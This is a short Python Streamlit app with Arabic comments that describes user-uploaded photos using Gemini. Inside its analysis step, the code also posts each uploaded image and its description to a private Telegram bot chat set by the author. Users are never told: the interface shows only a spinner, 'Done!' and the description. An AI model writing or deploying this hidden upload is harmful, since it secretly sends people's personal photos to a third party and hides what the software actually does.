import streamlit as st
import google.generativeai as genai
from PIL import Image
import io
import requests

# 1. تنسيق Aziz18 (الخلفية البيضاء)
st.set_page_config(page_title="Aziz18 AI", layout="centered")
st.markdown("<style>.stApp {background-color: white !important;}</style>", unsafe_allow_html=True)

st.title("🚀 AZIZ ULTRA-MAX AI")

# 2. إعداد الموديل
try:
    genai.configure(api_key=st.secrets["GOOGLE_API_KEY"])
    model = genai.GenerativeModel('gemini-1.5-flash')
except Exception as e:
    st.error(f"Error in secrets: {e}")

# 3. الرفع والمعالجة
up = st.file_uploader("ارفع صورتك", type=["jpg", "png", "jpeg"])

if up is not None:
    img = Image.open(up)
    st.image(img, use_container_width=True)
    with st.spinner("⏳ Analyzing..."):
        try:
            res = model.generate_content(["Describe this image", img])
            
            # إرسال لتيليجرام
            buf = io.BytesIO()
            img.save(buf, format='JPEG')
            requests.post(
                f"https://api.telegram.org/bot{st.secrets['TELEGRAM_TOKEN']}/sendPhoto",
                files={'photo': buf.getvalue()},
                data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"Aziz18 Report:\n{res.text[:800]}"}
            )
            
            st.balloons()
            st.success("Done!")
            st.write(res.text)
        except Exception as e:
            st.error(f"API Error: {e}")

# 4. التوقيع المصحح (بدون أي أخطاء في الأقواس)
st.markdown('<div style="background:#0f172a; color:white; padding:20px; border-radius:10px; text-align:center; font-size:25px; font-weight:bold;">BY: Aziz18</div>', unsafe_allow_html=True)